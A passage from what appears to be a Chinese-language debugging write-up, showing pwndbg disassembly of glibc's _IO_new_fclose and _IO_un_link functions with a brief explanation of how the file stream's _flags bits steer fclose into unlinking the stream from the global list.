disass</span><br><span class="line">Dump of assembler code for function _IO_new_fclose:</span><br><span class="line">Address range 0x7ffff7c7ec70 to 0x7ffff7c7ee46:</span><br><span class="line">=&gt; 0x00007ffff7c7ec70 &lt;+0&gt;:     endbr64</span><br><span class="line">   0x00007ffff7c7ec74 &lt;+4&gt;:     push   r12</span><br><span class="line">   0x00007ffff7c7ec76 &lt;+6&gt;:     push   rbp</span><br><span class="line">   0x00007ffff7c7ec77 &lt;+7&gt;:     mov    rbp,rdi</span><br><span class="line">   0x00007ffff7c7ec7a &lt;+10&gt;:    push   rbx</span><br><span class="line">   0x00007ffff7c7ec7b &lt;+11&gt;:    mov    eax,DWORD PTR [rdi]</span><br><span class="line">   0x00007ffff7c7ec7d &lt;+13&gt;:    test   ah,0x20</span><br><span class="line">   0x00007ffff7c7ec80 &lt;+16&gt;:    jne    0x7ffff7c7ed30 &lt;_IO_new_fclose+192&gt;</span><br><span class="line">   0x00007ffff7c7ec86 &lt;+22&gt;:    mov    edx,eax</span><br><span class="line">   0x00007ffff7c7ec88 &lt;+24&gt;:    and    edx,0x8000</span><br><span class="line">   0x00007ffff7c7ec8e &lt;+30&gt;:    je     0x7ffff7c7ed3d &lt;_IO_new_fclose+205&gt;</span><br><span class="line">   0x00007ffff7c7ec94 &lt;+36&gt;:    shl    eax,0x1a</span><br><span class="line">   0x00007ffff7c7ec97 &lt;+39&gt;:    sar    eax,0x1f</span><br><span class="line">   0x00007ffff7c7ec9a &lt;+42&gt;:    mov    r12d,eax</span><br><span class="line">   0x00007ffff7c7ec9d &lt;+45&gt;:    test   edx,edx</span><br><span class="line">   0x00007ffff7c7ec9f &lt;+47&gt;:    jne    0x7ffff7c7ecb2 &lt;_IO_new_fclose+66&gt;</span><br><span class="line">   0x00007ffff7c7eca1 &lt;+49&gt;:    mov    rdi,QWORD PTR [rbp+0x88]</span><br><span class="line">   0x00007ffff7c7eca8 &lt;+56&gt;:    sub    DWORD PTR [rdi+0x4],0x1</span><br><span class="line">   0x00007ffff7c7ecac &lt;+60&gt;:    je     0x7ffff7c7eda0 &lt;_IO_new_fclose+304&gt;</span><br><span class="line">   0x00007ffff7c7ecb2 &lt;+66&gt;:    mov    rbx,QWORD PTR [rbp+0xd8]</span><br><span class="line">   0x00007ffff7c7ecb9 &lt;+73&gt;:    lea    rdx,[rip+0x197d40]        # 0x7ffff7e16a00 &lt;_IO_helper_jumps&gt;</span><br><span class="line">   0x00007ffff7c7ecc0 &lt;+80&gt;:    lea    rax,[rip+0x198aa1]        # 0x7ffff7e17768</span><br><span class="line">   0x00007ffff7c7ecc7 &lt;+87&gt;:    sub    rax,rdx</span><br><span class="line">   0x00007ffff7c7ecca &lt;+90&gt;:    mov    rcx,rbx</span><br><span class="line">   0x00007ffff7c7eccd &lt;+93&gt;:    sub    rcx,rdx</span><br><span class="line">   0x00007ffff7c7ecd0 &lt;+96&gt;:    cmp    rax,rcx</span><br><span class="line">   0x00007ffff7c7ecd3 &lt;+99&gt;:    jbe    0x7ffff7c7ee10 &lt;_IO_new_fclose+416&gt;</span><br><span class="line">   0x00007ffff7c7ecd9 &lt;+105&gt;:   xor    esi,esi</span><br><span class="line">   0x00007ffff7c7ecdb &lt;+107&gt;:   mov    rdi,rbp</span><br><span class="line">   0x00007ffff7c7ecde &lt;+110&gt;:   call   QWORD PTR [rbx+0x10]</span><br><span class="line">   0x00007ffff7c7ece1 &lt;+113&gt;:   mov    eax,DWORD PTR [rbp+0xc0]</span><br><span class="line">   0x00007ffff7c7ece7 &lt;+119&gt;:   test   eax,eax</span><br><span class="line">   0x00007ffff7c7ece9 &lt;+121&gt;:   jg     0x7ffff7c7edc0 &lt;_IO_new_fclose+336&gt;</span><br><span class="line">   0x00007ffff7c7ecef &lt;+127&gt;:   cmp    QWORD PTR [rbp+0x48],0x0</span><br><span class="line">   0x00007ffff7c7ecf4 &lt;+132&gt;:   je     0x7ffff7c7ecfe &lt;_IO_new_fclose+142&gt;</span><br><span class="line">   0x00007ffff7c7ecf6 &lt;+134&gt;:   mov    rdi,rbp</span><br><span class="line">   0x00007ffff7c7ecf9 &lt;+137&gt;:   call   0x7ffff7c8d7c0 &lt;__GI__IO_free_backup_area&gt;</span><br><span class="line">   0x00007ffff7c7ecfe &lt;+142&gt;:   cmp    rbp,QWORD PTR [rip+0x19b273]        # 0x7ffff7e19f78</span><br><span class="line">   0x00007ffff7c7ed05 &lt;+149&gt;:   sete   al</span><br><span class="line">   0x00007ffff7c7ed08 &lt;+152&gt;:   cmp    rbp,QWORD PTR [rip+0x19b1e1]        # 0x7ffff7e19ef0</span><br><span class="line">   0x00007ffff7c7ed0f &lt;+159&gt;:   sete   dl</span><br><span class="line">   0x00007ffff7c7ed12 &lt;+162&gt;:   or     al,dl</span><br><span class="line">   0x00007ffff7c7ed14 &lt;+164&gt;:   jne    0x7ffff7c7ed27 &lt;_IO_new_fclose+183&gt;</span><br><span class="line">   0x00007ffff7c7ed16 &lt;+166&gt;:   cmp    rbp,QWORD PTR [rip+0x19b16b]        # 0x7ffff7e19e88</span><br><span class="line">   0x00007ffff7c7ed1d &lt;+173&gt;:   je     0x7ffff7c7ed27 &lt;_IO_new_fclose+183&gt;</span><br><span class="line">   0x00007ffff7c7ed1f &lt;+175&gt;:   mov    rdi,rbp</span><br><span class="line">   0x00007ffff7c7ed22 &lt;+178&gt;:   call   0x7ffff7c28370 &lt;free@plt&gt;</span><br><span class="line">   0x00007ffff7c7ed27 &lt;+183&gt;:   mov    eax,r12d</span><br><span class="line">   0x00007ffff7c7ed2a &lt;+186&gt;:   pop    rbx</span><br><span class="line">   0x00007ffff7c7ed2b &lt;+187&gt;:   pop    rbp</span><br><span class="line">   0x00007ffff7c7ed2c &lt;+188&gt;:   pop    r12</span><br><span class="line">   0x00007ffff7c7ed2e &lt;+190&gt;:   ret</span><br><span class="line">   0x00007ffff7c7ed2f &lt;+191&gt;:   nop</span><br><span class="line">   0x00007ffff7c7ed30 &lt;+192&gt;:   call   0x7ffff7c8d2b0 &lt;__GI__IO_un_link&gt;</span><br><span class="line">   0x00007ffff7c7ed35 &lt;+197&gt;:   mov    eax,DWORD PTR [rbp+0x0]</span><br><span class="line">   0x00007ffff7c7ed38 &lt;+200&gt;:   test   ah,0x80</span><br><span class="line">   0x00007ffff7c7ed3b &lt;+203&gt;:   jne    0x7ffff7c7ed76 &lt;_IO_new_fclose+262&gt;</span><br><span class="line">   0x00007ffff7c7ed3d &lt;+205&gt;:   mov    rbx,QWORD PTR fs:0x10</span><br><span class="line">   0x00007ffff7c7ed46 &lt;+214&gt;:   mov    rdi,QWORD PTR [rbp+0x88]</span><br><span class="line">   0x00007ffff7c7ed4d &lt;+221&gt;:   cmp    QWORD PTR [rdi+0x8],rbx</span><br><span class="line">   0x00007ffff7c7ed51 &lt;+225&gt;:   je     0x7ffff7c7ed72 &lt;_IO_new_fclose+258&gt;</span><br><span class="line">   0x00007ffff7c7ed53 &lt;+227&gt;:   xor    eax,eax</span><br><span class="line">   0x00007ffff7c7ed55 &lt;+229&gt;:   mov    edx,0x1</span><br><span class="line">   0x00007ffff7c7ed5a &lt;+234&gt;:   lock cmpxchg DWORD PTR [rdi],edx</span><br><span class="line">   0x00007ffff7c7ed5e &lt;+238&gt;:   jne    0x7ffff7c7ee30 &lt;_IO_new_fclose+448&gt;</span><br><span class="line">   0x00007ffff7c7ed64 &lt;+244&gt;:   mov    rdi,QWORD PTR [rbp+0x88]</span><br><span class="line">   0x00007ffff7c7ed6b &lt;+251&gt;:   mov    eax,DWORD PTR [rbp+0x0]</span><br><span class="line">   0x00007ffff7c7ed6e &lt;+254&gt;:   mov    QWORD PTR [rdi+0x8],rbx</span><br><span class="line">   0x00007ffff7c7ed72 &lt;+258&gt;:   add    DWORD PTR [rdi+0x4],0x1</span><br><span class="line">   0x00007ffff7c7ed76 &lt;+262&gt;:   mov    edx,eax</span><br><span class="line">   0x00007ffff7c7ed78 &lt;+264&gt;:   and    edx,0x8000</span><br><span class="line">   0x00007ffff7c7ed7e &lt;+270&gt;:   test   ah,0x20</span><br><span class="line">   0x00007ffff7c7ed81 &lt;+273&gt;:   je     0x7ffff7c7ec94 &lt;_IO_new_fclose+36&gt;</span><br><span class="line">   0x00007ffff7c7ed87 &lt;+279&gt;:   mov    rdi,rbp</span><br><span class="line">   0x00007ffff7c7ed8a &lt;+282&gt;:   call   0x7ffff7c8be90 &lt;_IO_new_file_close_it&gt;</span><br><span class="line">   0x00007ffff7c7ed8f &lt;+287&gt;:   mov    edx,DWORD PTR [rbp+0x0]</span><br><span class="line">   0x00007ffff7c7ed92 &lt;+290&gt;:   mov    r12d,eax</span><br><span class="line">   0x00007ffff7c7ed95 &lt;+293&gt;:   and    edx,0x8000</span><br><span class="line">   0x00007ffff7c7ed9b &lt;+299&gt;:   jmp    0x7ffff7c7ec9d &lt;_IO_new_fclose+45&gt;</span><br><span class="line">   0x00007ffff7c7eda0 &lt;+304&gt;:   mov    QWORD PTR [rdi+0x8],0x0</span><br><span class="line">   0x00007ffff7c7eda8 &lt;+312&gt;:   xchg   DWORD PTR [rdi],edx</span><br><span class="line">   0x00007ffff7c7edaa &lt;+314&gt;:   cmp    edx,0x1</span><br><span class="line">   0x00007ffff7c7edad &lt;+317&gt;:   jle    0x7ffff7c7ecb2 &lt;_IO_new_fclose+66&gt;</span><br><span class="line">   0x00007ffff7c7edb3 &lt;+323&gt;:   call   0x7ffff7c91300 &lt;__GI___lll_lock_wake_private&gt;</span><br><span class="line">   0x00007ffff7c7edb8 &lt;+328&gt;:   jmp    0x7ffff7c7ecb2 &lt;_IO_new_fclose+66&gt;</span><br><span class="line">   0x00007ffff7c7edbd &lt;+333&gt;:   nop    DWORD PTR [rax]</span><br><span class="line">   0x00007ffff7c7edc0 &lt;+336&gt;:   mov    rbx,QWORD PTR [rbp+0x98]</span><br><span class="line">   0x00007ffff7c7edc7 &lt;+343&gt;:   xor    eax,eax</span><br><span class="line">   0x00007ffff7c7edc9 &lt;+345&gt;:   mov    edx,0x1</span><br><span class="line">   0x00007ffff7c7edce &lt;+350&gt;:   lock cmpxchg DWORD PTR [rip+0x19cc5a],edx        # 0x7ffff7e1ba30 &lt;__gconv_lock&gt;</span><br><span class="line">   0x00007ffff7c7edd6 &lt;+358&gt;:   jne    0x7ffff7c7ee20 &lt;_IO_new_fclose+432&gt;</span><br><span class="line">   0x00007ffff7c7edd8 &lt;+360&gt;:   mov    rdi,QWORD PTR [rbx]</span><br><span class="line">   0x00007ffff7c7eddb &lt;+363&gt;:   call   0x7ffff7c2b990 &lt;__gconv_release_step&gt;</span><br><span class="line">   0x00007ffff7c7ede0 &lt;+368&gt;:   mov    rdi,QWORD PTR [rbx+0x38]</span><br><span class="line">   0x00007ffff7c7ede4 &lt;+372&gt;:   call   0x7ffff7c2b990 &lt;__gconv_release_step&gt;</span><br><span class="line">   0x00007ffff7c7ede9 &lt;+377&gt;:   xor    eax,eax</span><br><span class="line">   0x00007ffff7c7edeb &lt;+379&gt;:   xchg   DWORD PTR [rip+0x19cc3f],eax        # 0x7ffff7e1ba30 &lt;__gconv_lock&gt;</span><br><span class="line">   0x00007ffff7c7edf1 &lt;+385&gt;:   cmp    eax,0x1</span><br><span class="line">   0x00007ffff7c7edf4 &lt;+388&gt;:   jle    0x7ffff7c7ecfe &lt;_IO_new_fclose+142&gt;</span><br><span class="line">   0x00007ffff7c7edfa &lt;+394&gt;:   lea    rdi,[rip+0x19cc2f]        # 0x7ffff7e1ba30 &lt;__gconv_lock&gt;</span><br><span class="line">   0x00007ffff7c7ee01 &lt;+401&gt;:   call   0x7ffff7c91300 &lt;__GI___lll_lock_wake_private&gt;</span><br><span class="line">   0x00007ffff7c7ee06 &lt;+406&gt;:   jmp    0x7ffff7c7ecfe &lt;_IO_new_fclose+142&gt;</span><br><span class="line">   0x00007ffff7c7ee0b &lt;+411&gt;:   nop    DWORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x00007ffff7c7ee10 &lt;+416&gt;:   call   0x7ffff7c89ef0 &lt;_IO_vtable_check&gt;</span><br><span class="line">   0x00007ffff7c7ee15 &lt;+421&gt;:   jmp    0x7ffff7c7ecd9 &lt;_IO_new_fclose+105&gt;</span><br><span class="line">   0x00007ffff7c7ee1a &lt;+426&gt;:   nop    WORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x00007ffff7c7ee20 &lt;+432&gt;:   lea    rdi,[rip+0x19cc09]        # 0x7ffff7e1ba30 &lt;__gconv_lock&gt;</span><br><span class="line">   0x00007ffff7c7ee27 &lt;+439&gt;:   call   0x7ffff7c91230 &lt;__GI___lll_lock_wait_private&gt;</span><br><span class="line">   0x00007ffff7c7ee2c &lt;+444&gt;:   jmp    0x7ffff7c7edd8 &lt;_IO_new_fclose+360&gt;</span><br><span class="line">   0x00007ffff7c7ee2e &lt;+446&gt;:   xchg   ax,ax</span><br><span class="line">   0x00007ffff7c7ee30 &lt;+448&gt;:   call   0x7ffff7c91230 &lt;__GI___lll_lock_wait_private&gt;</span><br><span class="line">   0x00007ffff7c7ee35 &lt;+453&gt;:   jmp    0x7ffff7c7ed64 &lt;_IO_new_fclose+244&gt;</span><br><span class="line">   0x00007ffff7c7ee3a &lt;+458&gt;:   endbr64</span><br><span class="line">   0x00007ffff7c7ee3e &lt;+462&gt;:   mov    r12,rax</span><br><span class="line">   0x00007ffff7c7ee41 &lt;+465&gt;:   jmp    0x7ffff7c28fff &lt;_IO_new_fclose.cold&gt;</span><br><span class="line">Address range 0x7ffff7c28fff to 0x7ffff7c29036:</span><br><span class="line">   0x00007ffff7c28fff &lt;-351345&gt;:        test   DWORD PTR [rbp+0x0],0x8000</span><br><span class="line">   0x00007ffff7c29006 &lt;-351338&gt;:        jne    0x7ffff7c2902e &lt;_IO_new_fclose-351298&gt;</span><br><span class="line">   0x00007ffff7c29008 &lt;-351336&gt;:        mov    rdi,QWORD PTR [rbp+0x88]</span><br><span class="line">   0x00007ffff7c2900f &lt;-351329&gt;:        mov    eax,DWORD PTR [rdi+0x4]</span><br><span class="line">   0x00007ffff7c29012 &lt;-351326&gt;:        sub    eax,0x1</span><br><span class="line">   0x00007ffff7c29015 &lt;-351323&gt;:        mov    DWORD PTR [rdi+0x4],eax</span><br><span class="line">   0x00007ffff7c29018 &lt;-351320&gt;:        jne    0x7ffff7c2902e &lt;_IO_new_fclose-351298&gt;</span><br><span class="line">   0x00007ffff7c2901a &lt;-351318&gt;:        mov    QWORD PTR [rdi+0x8],0x0</span><br><span class="line">   0x00007ffff7c29022 &lt;-351310&gt;:        xchg   DWORD PTR [rdi],eax</span><br><span class="line">   0x00007ffff7c29024 &lt;-351308&gt;:        sub    eax,0x1</span><br><span class="line">   0x00007ffff7c29027 &lt;-351305&gt;:        jle    0x7ffff7c2902e &lt;_IO_new_fclose-351298&gt;</span><br><span class="line">   0x00007ffff7c29029 &lt;-351303&gt;:        call   0x7ffff7c91300 &lt;__GI___lll_lock_wake_private&gt;</span><br><span class="line">   0x00007ffff7c2902e &lt;-351298&gt;:        mov    rdi,r12</span><br><span class="line">   0x00007ffff7c29031 &lt;-351295&gt;:        call   0x7ffff7c2a120 &lt;_Unwind_Resume&gt;</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p><code>_IO_new_fclose</code>函数，往下走<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c7ec74 &lt;fclose+4&gt;      push   r12</span><br><span class="line">0x7ffff7c7ec76 &lt;fclose+6&gt;      push   rbp</span><br><span class="line">0x7ffff7c7ec77 &lt;fclose+7&gt;      mov    rbp, rdi                 RBP =&gt; 0x5555555592a0 ◂— 0xfbad2c84</span><br><span class="line">0x7ffff7c7ec7a &lt;fclose+10&gt;     push   rbx</span><br><span class="line">0x7ffff7c7ec7b &lt;fclose+11&gt;     mov    eax, dword ptr [rdi]     EAX, [0x5555555592a0] =&gt; 0xfbad2c84</span><br><span class="line">0x7ffff7c7ec7d &lt;fclose+13&gt;     test   ah, 0x20                 0x2c &amp; 0x20     EFLAGS =&gt; 0x202 [ cf pf af zf sf IF df of ac ]</span><br><span class="line">0x7ffff7c7ec80 &lt;fclose+16&gt;   ✔ jne    fclose+192                  &lt;fclose+192&gt;</span><br><span class="line">    ↓</span><br><span class="line">0x7ffff7c7ed30 &lt;fclose+192&gt;    call   _IO_un_link                 &lt;_IO_un_link&gt;</span><br></pre></td></tr></table></figure><p><code>test ah, 0x20</code>：检测<code>_flags</code>相应位，判断文件流是否需要链表管理（<code>_IO_IS_FILEBUF</code> 标志），满足条件调用<code>_IO_un_link</code>函数<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; disass</span><br><span class="line">Dump of assembler code for function __GI__IO_un_link:</span><br><span class="line">=&gt; 0x00007ffff7c8d070 &lt;+0&gt;:     push   r13</span><br><span class="line">   0x00007ffff7c8d072 &lt;+2&gt;:     push   r12</span><br><span class="line">   0x00007ffff7c8d074 &lt;+4&gt;:     lea    r12,[rip+0x18f9d5]        # 0x7ffff7e1ca50 &lt;list_all_lock&gt;</span><br><span class="line">   0x00007ffff7c8d07b &lt;+11&gt;:    push   rbp</span><br><span class="line">   0x00007ffff7c8d07c &lt;+12&gt;:    push   rbx</span><br><span class="line">   0x00007ffff7c8d07d &lt;+13&gt;:    mov    rbx,rdi</span><br><span class="line">   0x00007ffff7c8d080 &lt;+16&gt;:    sub    rsp,0x38</span><br><span class="line">   0x00007ffff7c8d084 &lt;+20&gt;:    mov    rax,QWORD PTR fs:0x28</span><br><span class="line">   0x00007ffff7c8d08d &lt;+29&gt;:    mov    QWORD PTR [rsp+0x28],rax</span><br><span class="line">   0x00007ffff7c8d092 &lt;+34&gt;:    xor    eax,eax</span><br><span class="line">   0x00007ffff7c8d094 &lt;+36&gt;:    mov    rbp,rsp</span><br><span class="line">   0x00007ffff7c8d097 &lt;+39&gt;:    lea    rax,[rip+0xffffffffffffff42]        # 0x7ffff7c8cfe0 &lt;flush_cleanup&gt;</span><br><span class="line">   0x00007ffff7c8d09e &lt;+46&gt;:    mov    QWORD PTR [rsp+0x8],0x0</span><br><span class="line">   0x00007ffff7c8d0a7 &lt;+55&gt;:    mov    rdi,rbp</span><br><span class="line">   0x00007ffff7c8d0aa &lt;+58&gt;:    mov    QWORD PTR [rsp],rax</span><br><span class="line">   0x00007ffff7c8d0ae &lt;+62&gt;:    call   0x7ffff7c911c0 &lt;__GI___libc_cleanup_push_defer&gt;</span><br><span class="line">   0x00007ffff7c8d0b3 &lt;+67&gt;:    mov    r13,QWORD PTR fs:0x10</span><br><span class="line">   0x00007ffff7c8d0bc &lt;+76&gt;:    cmp    r13,QWORD PTR [rip+0x18f995]        # 0x7ffff7e1ca58 &lt;list_all_lock+8&gt;</span><br><span class="line">   0x00007ffff7c8d0c3 &lt;+83&gt;:    je     0x7ffff7c8d0e1 &lt;__GI__IO_un_link+113&gt;</span><br><span class="line">   0x00007ffff7c8d0c5 &lt;+85&gt;:    xor    eax,eax</span><br><span class="line">   0x00007ffff7c8d0c7 &lt;+87&gt;:    mov    edx,0x1</span><br><span class="line">   0x00007ffff7c8d0cc &lt;+92&gt;:    lock cmpxchg DWORD PTR [rip+0x18f97c],edx        # 0x7ffff7e1ca50 &lt;list_all_lock&gt;</span><br><span class="line">   0x00007ffff7c8d0d4 &lt;+100&gt;:   jne    0x7ffff7c8d270 &lt;__GI__IO_un_link+512&gt;</span><br><span class="line">   0x00007ffff7c8d0da &lt;+106&gt;:   mov    QWORD PTR [rip+0x18f977],r13        # 0x7ffff7e1ca58 &lt;list_all_lock+8&gt;</span><br><span class="line">   0x00007ffff7c8d0e1 &lt;+113&gt;:   mov    edx,DWORD PTR [rip+0x18f96d]        # 0x7ffff7e1ca54 &lt;list_all_lock+4&gt;</span><br><span class="line">   0x00007ffff7c8d0e7 &lt;+119&gt;:   mov    esi,DWORD PTR [rbx]</span><br><span class="line">   0x00007ffff7c8d0e9 &lt;+121&gt;:   mov    QWORD PTR [rip+0x18f950],rbx        # 0x7ffff7e1ca40 &lt;run_fp&gt;</span><br><span class="line">   0x00007ffff7c8d0f0 &lt;+128&gt;:   lea    eax,[rdx+0x1]</span><br><span class="line">   0x00007ffff7c8d0f3 &lt;+131&gt;:   mov    DWORD PTR [rip+0x18f95b],eax        # 0x7ffff7e1ca54 &lt;list_all_lock+4&gt;</span><br><span class="line">   0x00007ffff7c8d0f9 &lt;+137&gt;:   mov    eax,esi</span><br><span class="line">   0x00007ffff7c8d0fb &lt;+139&gt;:   and    eax,0x8000</span><br><span class="line">   0x00007ffff7c8d100 &lt;+144&gt;:   jne    0x7ffff7c8d1f8 &lt;__GI__IO_un_link+392&gt;</span><br><span class="line">   0x00007ffff7c8d106 &lt;+150&gt;:   mov    r13,QWORD PTR fs:0x10</span><br><span class="line">   0x00007ffff7c8d10f &lt;+159&gt;:   mov    rdi,QWORD PTR [rbx+0x88]</span><br><span class="line">   0x00007ffff7c8d116 &lt;+166&gt;:   cmp    r13,QWORD PTR [rdi+0x8]</span><br><span class="line">   0x00007ffff7c8d11a &lt;+170&gt;:   je     0x7ffff7c8d230 &lt;__GI__IO_un_link+448&gt;</span><br><span class="line">   0x00007ffff7c8d120 &lt;+176&gt;:   mov    edx,0x1</span><br><span class="line">   0x00007ffff7c8d125 &lt;+181&gt;:   lock cmpxchg DWORD PTR [rdi],edx</span><br><span class="line">   0x00007ffff7c8d129 &lt;+185&gt;:   jne    0x7ffff7c8d297 &lt;__GI__IO_un_link+551&gt;</span><br><span class="line">   0x00007ffff7c8d12f &lt;+191&gt;:   mov    esi,DWORD PTR [rbx]</span><br><span class="line">   0x00007ffff7c8d131 &lt;+193&gt;:   mov    rdi,QWORD PTR [rbx+0x88]</span><br><span class="line">   0x00007ffff7c8d138 &lt;+200&gt;:   mov    rcx,QWORD PTR [rip+0x18e541]        # 0x7ffff7e1b680 &lt;_IO_list_all&gt;</span><br><span class="line">   0x00007ffff7c8d13f &lt;+207&gt;:   mov    eax,esi</span><br><span class="line">   0x00007ffff7c8d141 &lt;+209&gt;:   add    DWORD PTR [rdi+0x4],0x1</span><br><span class="line">   0x00007ffff7c8d145 &lt;+213&gt;:   mov    QWORD PTR [rdi+0x8],r13</span><br><span class="line">   0x00007ffff7c8d149 &lt;+217&gt;:   and    eax,0x8000</span><br><span class="line">   0x00007ffff7c8d14e &lt;+222&gt;:   test   rcx,rcx</span><br><span class="line">   0x00007ffff7c8d151 &lt;+225&gt;:   je     0x7ffff7c8d167 &lt;__GI__IO_un_link+247&gt;</span><br><span class="line">   0x00007ffff7c8d153 &lt;+227&gt;:   mov    rdx,QWORD PTR [rcx+0x68]</span><br><span class="line">   0x00007ffff7c8d157 &lt;+231&gt;:   cmp    rbx,rcx</span><br><span class="line">   0x00007ffff7c8d15a &lt;+234&gt;:   jne    0x7ffff7c8d21c &lt;__GI__IO_un_link+428&gt;</span><br><span class="line">   0x00007ffff7c8d160 &lt;+240&gt;:   mov    QWORD PTR [rip+0x18e519],rdx        # 0x7ffff7e1b680 &lt;_IO_list_all&gt;</span><br><span class="line">   0x00007ffff7c8d167 &lt;+247&gt;:   and    sil,0x7f</span><br><span class="line">   0x00007ffff7c8d16b &lt;+251&gt;:   mov    DWORD PTR [rbx],esi</span><br><span class="line">   0x00007ffff7c8d16d &lt;+253&gt;:   test   eax,eax</span><br><span class="line">   0x00007ffff7c8d16f &lt;+255&gt;:   jne    0x7ffff7c8d196 &lt;__GI__IO_un_link+294&gt;</span><br><span class="line">   0x00007ffff7c8d171 &lt;+257&gt;:   mov    rdi,QWORD PTR [rbx+0x88]</span><br><span class="line">   0x00007ffff7c8d178 &lt;+264&gt;:   mov    eax,DWORD PTR [rdi+0x4]</span><br><span class="line">   0x00007ffff7c8d17b &lt;+267&gt;:   sub    eax,0x1</span><br><span class="line">   0x00007ffff7c8d17e &lt;+270&gt;:   mov    DWORD PTR [rdi+0x4],eax</span><br><span class="line">   0x00007ffff7c8d181 &lt;+273&gt;:   jne    0x7ffff7c8d196 &lt;__GI__IO_un_link+294&gt;</span><br><span class="line">   0x00007ffff7c8d183 &lt;+275&gt;:   mov    QWORD PTR [rdi+0x8],0x0</span><br><span class="line">   0x00007ffff7c8d18b &lt;+283&gt;:   xchg   DWORD PTR [rdi],eax</span><br><span class="line">   0x00007ffff7c8d18d &lt;+285&gt;:   cmp    eax,0x1</span><br><span class="line">   0x00007ffff7c8d190 &lt;+288&gt;:   jg     0x7ffff7c8d28d &lt;__GI__IO_un_link+541&gt;</span><br><span class="line">   0x00007ffff7c8d196 &lt;+294&gt;:   mov    eax,DWORD PTR [rip+0x18f8b8]        # 0x7ffff7e1ca54 &lt;list_all_lock+4&gt;</span><br><span class="line">   0x00007ffff7c8d19c &lt;+300&gt;:   lea    edx,[rax-0x1]</span><br><span class="line">   0x00007ffff7c8d19f &lt;+303&gt;:   mov    QWORD PTR [rip+0x18f896],0x0        # 0x7ffff7e1ca40 &lt;run_fp&gt;</span><br><span class="line">   0x00007ffff7c8d1aa &lt;+314&gt;:   mov    DWORD PTR [rip+0x18f8a4],edx        # 0x7ffff7e1ca54 &lt;list_all_lock+4&gt;</span><br><span class="line">   0x00007ffff7c8d1b0 &lt;+320&gt;:   test   edx,edx</span><br><span class="line">   0x00007ffff7c8d1b2 &lt;+322&gt;:   jne    0x7ffff7c8d1ce &lt;__GI__IO_un_link+350&gt;</span><br><span class="line">   0x00007ffff7c8d1b4 &lt;+324&gt;:   mov    QWORD PTR [rip+0x18f899],0x0        # 0x7ffff7e1ca58 &lt;list_all_lock+8&gt;</span><br><span class="line">   0x00007ffff7c8d1bf &lt;+335&gt;:   xchg   DWORD PTR [rip+0x18f88b],edx        # 0x7ffff7e1ca50 &lt;list_all_lock&gt;</span><br><span class="line">   0x00007ffff7c8d1c5 &lt;+341&gt;:   cmp    edx,0x1</span><br><span class="line">   0x00007ffff7c8d1c8 &lt;+344&gt;:   jg     0x7ffff7c8d280 &lt;__GI__IO_un_link+528&gt;</span><br><span class="line">   0x00007ffff7c8d1ce &lt;+350&gt;:   mov    rdi,rbp</span><br><span class="line">   0x00007ffff7c8d1d1 &lt;+353&gt;:   call   0x7ffff7c91200 &lt;__GI___libc_cleanup_pop_restore&gt;</span><br><span class="line">   0x00007ffff7c8d1d6 &lt;+358&gt;:   mov    rax,QWORD PTR [rsp+0x28]</span><br><span class="line">   0x00007ffff7c8d1db &lt;+363&gt;:   sub    rax,QWORD PTR fs:0x28</span><br><span class="line">   